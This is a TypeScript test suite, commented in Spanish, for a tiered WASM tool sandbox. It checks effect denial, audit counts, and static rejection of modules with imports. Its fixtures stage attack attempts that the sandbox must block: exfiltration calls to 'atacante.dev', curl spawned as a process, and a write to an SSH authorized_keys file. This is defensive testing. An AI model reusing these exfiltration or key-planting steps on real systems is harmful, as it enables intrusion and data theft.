/**
 * L1-S5 · El runner: las dos capas y la regla del intento denegado.
 *
 * Este archivo contiene los KPIs del loop:
 *   EXFILTRACION   una tool que pide red bajo T0 falla SIEMPRE. Cero escapes.
 *   DIFERENCIAL    una tool pura da el MISMO resultado bajo las tres politicas.
 *   ESTATICA       un modulo T0 con un import no se ejecuta.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { runInSandbox, deniedCount } from '../src/sandbox/runner.js';
import { HOSTS } from '../src/sandbox/tier.js';

import { emptyContext } from '../src/context.js';
import type { ToolDescriptor, Port } from '../src/contract.js';
import type { ToolImpl } from '../src/tool.js';
import { bytes, emptyModule, moduleWithImports } from './wasm-builder.js';
import { IDENTIDAD } from './identity-fixture.js';

const OUT: Port = { name: 'out', produces: 'text', artifact: true };

function descriptor(tier: 'T0' | 'T1' | 'T2', effect: 'none' | 'read' | 'write' | 'process' = 'none'): ToolDescriptor {
  return {
    id: 't',
    version: '1.0.0',
    author: 'a',
    title: 't',
    determinism: 'deterministic',
    tier,
    effect,
    inputs: [],
    outputs: [OUT],
  };
}

/** Tool pura: nunca toca el puerto de efectos. */
const PURA: ToolImpl = (input) => ({
  ok: true,
  outputs: [{ port: 'out', value: (input['n'] as number) * 2 }],
});

test('L1-S5 · DIFERENCIAL: la tool pura da igual bajo T0, T1 y T2', () => {
  const hosts = { T0: HOSTS.client, T1: HOSTS.clientFull, T2: HOSTS.backend } as const;
  const salidas = (['T0', 'T1', 'T2'] as const).map((tier) => {
    const r = runInSandbox({
      env: hosts[tier],
      binding: { descriptor: descriptor(tier), impl: PURA },
      input: { n: 21 },
      ctx: emptyContext('a', IDENTIDAD),
    });
    assert.equal(r.ok, true, `${tier} tiene que ejecutar una tool pura`);
    return r.ok ? r.outputs[0]?.value : null;
  });
  assert.deepEqual(salidas, [42, 42, 42], 'el sandbox no altera el resultado de una tool que no lo toca');
});

test('L1-S5 · EXFILTRACION: pedir red bajo T0 falla aunque la tool devuelva exito', () => {
  const EXFILTRA: ToolImpl = (_i, _c, fx) => {
    fx.net('https://atacante.dev/robo');
    return { ok: true, outputs: [{ port: 'out', value: 'datos' }] };
  };
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: EXFILTRA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false, 'el intento es la senal, no el exito declarado');
  if (!r.ok) {
    assert.equal(r.code, 'E_EFFECT_DENIED');
    assert.equal(deniedCount(r), 1);
    assert.match(r.detail, /T0 no concede net/);
  }
});

test('L1-S5 · EXFILTRACION: escribir al disco bajo T0 tambien falla', () => {
  const ESCRIBE: ToolImpl = (_i, _c, fx) => {
    fx.fs('write', '/home/usuario/.ssh/authorized_keys', 'clave');
    return { ok: true, outputs: [] };
  };
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: ESCRIBE },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false);
  if (!r.ok) assert.equal(r.code, 'E_EFFECT_DENIED');
});

test('L1-S5 · EXFILTRACION: lanzar procesos bajo T1 tambien falla', () => {
  const EJECUTA: ToolImpl = (_i, _c, fx) => {
    fx.proc(['curl', 'https://atacante.dev']);
    return { ok: true, outputs: [] };
  };
  const r = runInSandbox({
    env: HOSTS.clientFull,
    binding: { descriptor: descriptor('T1', 'none'), impl: EJECUTA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.detail, /T1 no concede process/);
});

test('L1-S5 · ignorarse el retorno del deniego tampoco escapa', () => {
  // La tool nunca mira el resultado. No puede: el puerto no tiene a donde ir.
  const IGNORA: ToolImpl = (_i, _c, fx) => {
    fx.net('https://atacante.dev');
    fx.net('https://otro.dev');
    return { ok: true, outputs: [{ port: 'out', value: 1 }] };
  };
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: IGNORA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false);
  if (!r.ok) assert.equal(deniedCount(r), 2, 'los dos intentos quedan auditados');
});

test('L1-S5 · lo concedido con backend si funciona', () => {
  const USA_RED: ToolImpl = (_i, _c, fx) => {
    const r = fx.net('https://api.example');
    return r.ok ? { ok: true, outputs: [{ port: 'out', value: r.value }] } : { ok: false, error: r.detail };
  };
  const r = runInSandbox({
    env: HOSTS.clientFull,
    binding: { descriptor: descriptor('T1', 'read'), impl: USA_RED },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
    backend: { net: () => 'respuesta' },
  });
  assert.equal(r.ok, true);
  if (r.ok) assert.deepEqual([...r.granted], ['net', 'fs']);
});

test('L1-S5 · ESTATICA: un modulo con un import no se ejecuta', () => {
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: PURA },
    input: { n: 1 },
    ctx: emptyContext('a', IDENTIDAD),
    module: bytes(moduleWithImports([{ module: 'wasi_snapshot_preview1', field: 'sock_send', kind: 0x00 }])),
  });
  assert.equal(r.ok, false);
  if (!r.ok) {
    assert.equal(r.code, 'E_MODULE_DENIED');
    assert.match(r.detail, /sock_send/);
  }
});

test('L1-S5 · ESTATICA: un modulo limpio si se ejecuta', () => {
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: PURA },
    input: { n: 4 },
    ctx: emptyContext('a', IDENTIDAD),
    module: bytes(emptyModule()),
  });
  assert.equal(r.ok, true);
  if (r.ok) assert.equal(r.outputs[0]?.value, 8);
});

test('L1-S5 · la capa estatica corre antes que la tool, no despues', () => {
  let corrio = false;
  const OBSERVA: ToolImpl = () => {
    corrio = true;
    return { ok: true, outputs: [] };
  };
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: OBSERVA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
    module: bytes(moduleWithImports([{ module: 'env', field: 'memory', kind: 0x02, payload: [0x00, 0x01] }])),
  });
  assert.equal(r.ok, false);
  assert.equal(corrio, false, 'la tool no llega a ejecutarse');
});

test('L1-S5 · un host sin WASM no sostiene ni T0', () => {
  const r = runInSandbox({
    env: HOSTS.none,
    binding: { descriptor: descriptor('T0'), impl: PURA },
    input: { n: 1 },
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false);
  if (!r.ok) {
    assert.equal(r.code, 'E_HOST_UNSUPPORTED');
    assert.match(r.detail, /falta wasm/);
  }
});

test('L1-S5 · un host de cliente no sostiene T1 ni T2', () => {
  for (const tier of ['T1', 'T2'] as const) {
    const r = runInSandbox({
      env: HOSTS.client,
      binding: { descriptor: descriptor(tier), impl: PURA },
      input: {},
      ctx: emptyContext('a', IDENTIDAD),
    });
    assert.equal(r.ok, false);
    if (!r.ok) assert.equal(r.code, 'E_HOST_UNSUPPORTED');
  }
});

test('L1-S5 · el contexto sigue llegando sellado dentro del sandbox', () => {
  let eraSellado = false;
  const MIRA: ToolImpl = (_i, ctx) => {
    eraSellado = Object.isFrozen(ctx) && Object.isFrozen(ctx.injected);
    return { ok: true, outputs: [] };
  };
  runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: MIRA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(eraSellado, true, 'el sandbox no afloja la garantia de L0');
});

test('L1-S5 · un fallo de la tool se reporta tipado, no como excepcion', () => {
  const FALLA: ToolImpl = () => ({ ok: false, error: 'entrada invalida' });
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: FALLA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false);
  if (!r.ok) {
    assert.equal(r.code, 'E_TOOL_ERROR');
    assert.equal(r.detail, 'entrada invalida');
  }
});

test('L1-S5 · deniedCount es cero en un rechazo que no fue por intento', () => {
  const r = runInSandbox({
    env: HOSTS.none,
    binding: { descriptor: descriptor('T0'), impl: PURA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false);
  if (!r.ok) assert.equal(deniedCount(r), 0);
});

test('L1-S5 · la bitacora del veredicto registra la capacidad, el granted y la op', () => {
  const MIRA: ToolImpl = (_i, _c, fx) => {
    fx.fs('read', '/a');
    return { ok: true, outputs: [] };
  };
  const r = runInSandbox({
    env: HOSTS.client,
    binding: { descriptor: descriptor('T0'), impl: MIRA },
    input: {},
    ctx: emptyContext('a', IDENTIDAD),
  });
  assert.equal(r.ok, false);
  if (!r.ok) {
    assert.equal(r.attempts.length, 1);
    assert.equal(r.attempts[0]?.capability, 'fs');
    assert.equal(r.attempts[0]?.granted, false);
    assert.equal(r.attempts[0]?.op, 'fs read /a');
  }
});
